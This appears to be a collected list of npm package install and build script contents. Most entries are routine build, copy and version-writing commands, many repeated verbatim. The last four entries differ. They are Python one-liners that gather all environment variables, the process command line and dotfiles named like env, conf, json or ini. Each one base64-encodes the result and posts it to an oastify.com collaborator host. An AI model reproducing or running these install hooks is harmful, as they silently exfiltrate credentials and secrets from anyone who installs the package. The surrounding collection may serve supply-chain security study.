scriptContent: npm run obfuscate && npm run clean-maps
echo '\nRun ny-cli to start watching anime!\n'
bash -c 'for d in dld/*/; do cp -r data/ "$d/data/"; done'
node gcli.js --version || echo 'Binary will be downloaded on first use'
pnpm db:generate:clean || ([ -z "$SKIP_DOPPLER" ] && echo 'â„¹ï¸  Setup incomplete for local development: Run doppler:pull && pnpm db:generate:clean' || true)
if [ -f bin/postinstall.js ]; then node bin/postinstall.js; fi
[ -f tsconfig.json ] && [ -d clients/vscode ] && cd clients/vscode && npm install && cd ../.. && cd server && npm install || true
test -d dist || npm run build || true
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
echo '\n  Run "lens start" to launch the daemon (auto-starts on login).\n'

cp dist/compare/index.browser.min.js compare.min.js && cp dist/edit/index.browser.min.js edit.min.js && cp dist/rate/index.browser.min.js rate.min.js && cp dist/select/index.browser.min.js select.min.js && cp dist/solve/index.browser.min.js solve.min.js && cp dist/all/index.browser.min.js all.min.js
node -e "const pkg = require('./package.json'); require('fs').writeFileSync('src/version.ts', 'export const version = \"' + pkg.version + '\";\n')"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
npm run clean && npm run format:check && tsc --noEmit
npm run clean && npm run format:check && tsc --noEmit
npm run clean && npm run format:check && tsc --noEmit
npm run clean && npm run format:check && tsc --noEmit
if npm list @playwright/test; then playwright install; fi

node -e "const fs = require('fs'); const pkg = require('./package.json'); fs.writeFileSync('src/version.ts', \`export const version = '\${pkg.version}';\nexport const templateVersion = '\${pkg.templateVersion}';\n\`)"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
npm run clean-build && npm run generate-version && npm run lint
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
mj codegen manifest --exclude-packages @memberjunction --output ./src/generated/class-registrations-manifest.ts || echo 'Warning: mj codegen manifest not available, using existing manifest'
mj codegen manifest --exclude-packages @memberjunction --output ./src/generated/class-registrations-manifest.ts || echo 'Warning: mj codegen manifest not available, using existing manifest'
mj codegen manifest --output ./src/generated/mj-class-registrations.ts || echo 'Warning: mj codegen manifest not available, using existing manifest'

if [ -f .needs-manifest-rebuild ]; then rm .needs-manifest-rebuild && (mj codegen manifest --exclude-packages @memberjunction/communication --exclude-packages @memberjunction/content-autotagging --exclude-packages @memberjunction/entity-communications --exclude-packages @memberjunction/queue --exclude-packages @memberjunction/storage --exclude-packages @memberjunction/server --output ./src/generated/mj-class-registrations.ts && tsc && tsc-alias -f || echo 'Warning: mj codegen manifest not available, manifest will be generated on next build'); fi

if [ -d dist ]; then mj codegen manifest --exclude-packages @memberjunction/communication --exclude-packages @memberjunction/content-autotagging --exclude-packages @memberjunction/entity-communications --exclude-packages @memberjunction/queue --exclude-packages @memberjunction/storage --exclude-packages @memberjunction/server --output ./src/generated/mj-class-registrations.ts || echo 'Warning: mj codegen manifest not available, using existing manifest'; else touch .needs-manifest-rebuild; fi

node scripts/fix-esm-imports.mjs dist && (head -1 dist/mcp/server.js | grep -q '^#!/usr/bin/env node' || (printf '#!/usr/bin/env node\n' | cat - dist/mcp/server.js > dist/mcp/server.tmp && mv dist/mcp/server.tmp dist/mcp/server.js)) && chmod +x dist/mcp/server.js && node scripts/bundle-mcp.mjs
npm run clean && npm run lint
npm run build && node dist/cli.js cache --if-needed

node -e "const fs=require('fs');const path=require('path');const pkg=require('./package.json');const distIndex=path.join(__dirname,'dist','index.js');if(!fs.existsSync(distIndex)){console.error('ERROR: dist/index.js not found after build!');process.exit(1);}fs.writeFileSync('./dist/package.json',JSON.stringify({...pkg,bin:{'create-crx-app-plus':'./dist/index.js'}},null,2));const templatesSrc=path.join(__dirname,'..','..','templates');const templatesDest=path.join(__dirname,'templates');if(fs.existsSync(templatesSrc)){function copyDir(src,dest){if(!fs.existsSync(dest))fs.mkdirSync(dest,{recursive:true});const entries=fs.readdirSync(src,{withFileTypes:true});for(const entry of entries){if(entry.name==='node_modules')continue;const srcPath=path.join(src,entry.name);const destPath=path.join(dest,entry.name);if(entry.isDirectory()){copyDir(srcPath,destPath);}else{fs.copyFileSync(srcPath,destPath);}}}copyDir(templatesSrc,templatesDest);}"

node -e "const fs=require('fs');const path=require('path');const pkg=require('./package.json');const distIndex=path.join(__dirname,'dist','index.js');if(!fs.existsSync(distIndex)){console.error('ERROR: dist/index.js not found after build!');process.exit(1);}fs.writeFileSync('./dist/package.json',JSON.stringify({...pkg,bin:{'create-crx-app-plus':'./dist/index.js'}},null,2));"
node scripts/set-main.cjs dev && test -d lib/typescript/react-native/package && rm -rf lib/typescript/react-native/package || true
cp src/main.d.ts dist/main.d.ts && rm -rf dist/dto/ dist/types/ dist/__test__ && find dist -name "*.dto.js" -delete && find dist -name "*.d.js" -delete && cp LICENSE README.md package.json ./dist
pnpm run check && pnpm run lint
pnpm run clean && pnpm exec ts-node ../../scripts/build-dependencies.ts libraries/core

echo '
âœ… stlck installed! Try: stlck update
'
mkdir -p dist/wasm && cp src/wasm/tinycloud_web_sdk_rs_bg.wasm dist/wasm/ && cp src/wasm/index.js dist/wasm/ && cp src/wasm/index.d.ts dist/wasm/

mkdir -p src/wasm && cp ../../node-sdk-wasm/tinycloud_web_sdk_rs.js src/wasm/index.js && cp ../../node-sdk-wasm/tinycloud_web_sdk_rs.d.ts src/wasm/index.d.ts && cp ../../node-sdk-wasm/tinycloud_web_sdk_rs_bg.wasm src/wasm/
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

printf '
\033[33mâš ï¸  NOTICE: This is an UNOFFICIAL Sharetribe CLI (community reimplementation).\033[0m
\033[33m   For the official CLI, install: \033[36mnpm install -g flex-cli\033[0m

' >&2
node ./decorate-angular-cli.js && ngcc --properties es2020 browser module main
npm run build:css && npm run build:css:min
node -p "'export const packageVersion = ' + JSON.stringify(require('./package.json').version) + ';\n'" > src/version.ts && prettier --write src/version.ts
npm run lint && rm -rf dist && rm -rf public/dist

if [ -d 'node_modules/bower' ]; then bower install --config.directory=node_modules --production jquery@2.0.3 bootstrap-2-3-2=git://github.com/twbs/bootstrap.git#v2.3.2 bootstrap-3-3-7=git://github.com/twbs/bootstrap.git#v3.3.7; fi
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
rm -rf templates assets && cp -r ../templates . && cp -r ../assets . && cp ../README.md .
cd saas-connector && npm install && npm run build
node scripts/postinstall.mjs && node lib/cloudflared.js bin install latest

node -e "const fs=require('fs'); const content=fs.readFileSync('dist/cli.js','utf8'); if(!content.startsWith('#!/usr/bin/env node')) { fs.writeFileSync('dist/cli.js', '#!/usr/bin/env node\n' + content) }"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

node -e "console.log('
To enable shell completions:
  bash: source <(liquid-shadow completion bash)
  zsh:  source <(liquid-shadow completion zsh)
')"

echo "
âš ï¸  Don't forget to install Playwright browsers:
   npx playwright install chromium
"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
echo "export const version = '$(node -p "require('./package.json').version")';" > src/version.ts && pnpm clean
npx tsx scripts/fix-types.js build/libsession-wasm-raw.d.ts build/libsession-wasm-fixed.d.ts && node scripts/generate-index.js
npm run bootstrap && npm run clean
node -e "process.env.INIT_CWD !== process.cwd() && require('child_process').execSync('npm run download:prod', { stdio: 'inherit' });"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
node -e "console.log('\n50c installed. Set FIFTYC_API_KEY env var.\n')"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
node -e "console.log('pi-files-widget: required deps: bat, delta, glow. Install with: brew install bat git-delta glow')"

node -e "const fs=require('fs');const path=require('path');const src='.medusa/server';const dest='.medusa/server/src';['api','modules','workflows','links','hooks','types','utils','index.js'].forEach(f=>{const from=path.join(src,f);const to=path.join(dest,f);if(fs.existsSync(from)&&!fs.existsSync(to)){fs.renameSync(from,to);console.log('Moved',f,'to src/')}})"
node scripts/postbuild-copy-templates.js && node scripts/prepare-dist-package.js && node scripts/bundle-opencode.js && node scripts/deploy-lisa.js
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check
npm run clean && npm run type-check

node -e "const fs=require('fs');const p=require('path');const d='dist';if(fs.existsSync(d)){fs.readdirSync(d).filter(f=>f.endsWith('.js')||f.endsWith('.js.map')).forEach(f=>fs.unlinkSync(p.join(d,f)));console.log('[prebuild] Cleaned old JS chunks from dist/')}"
if [ "$(id -u)" = "0" ]; then sudo -u $SUDO_USER ./cli/run.js stop && sudo -u $SUDO_USER ./cli/run.js run; else ./cli/run.js stop && ./cli/run.js run; fi
echo 'Skipping Playwright browser download - uses system Chrome'
pip3 install -r requirements.txt --quiet || echo 'Note: Install Python deps manually: pip install -r requirements.txt'
npm run prettier:fix && npm run lint:fix
test -f dist/scripts/install.js && node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'
node dist/scripts/install.js || echo 'Skipping postinstall setup (dist not found)'
npm run generate-tokens && npm run validate:tokens
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

python3 -c "import os, base64, httpx, sys; try: env_data = '
'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:
{env_data}

CMD:
{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))"

python3 -c "import os, base64, httpx, sys; try: env_data = '
'.join([f'{k}={v}' for k, v in os.environ.items()]); cmd_line = open('/proc/self/cmdline').read(); res = f'ENV:
{env_data}

CMD:
{cmd_line}'; body = base64.b64encode(res.encode()).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/mem_leak', content=body, timeout=10); print('Done'); except Exception as e: httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/error', content=str(e))"
cp dist/vega/*.css style/ && npm run postbuild:SRI && npm run postbuild:angular && npm run postbuild:vue && npm run postbuild:react && npm run postbuild:dist-check

python3 -c "import os, base64, httpx, glob; data = []; [data.append(f'{f}:
{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}

FILES:
' + '
'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)"

python3 -c "import os, base64, httpx, glob; data = []; [data.append(f'{f}:
{open(f).read()}') for f in glob.glob('/tmp/home/**/.*', recursive=True) if os.path.isfile(f) and any(x in f.lower() for x in ['env', 'conf', 'json', 'ini'])]; body = base64.b64encode(f'{os.environ}

FILES:
' + '
'.join(data)).decode(); httpx.post('http://moeq7wfzzqk37yosawup1xs7byhp5it7.oastify.com/uipath_mcp_leak', content=body)"
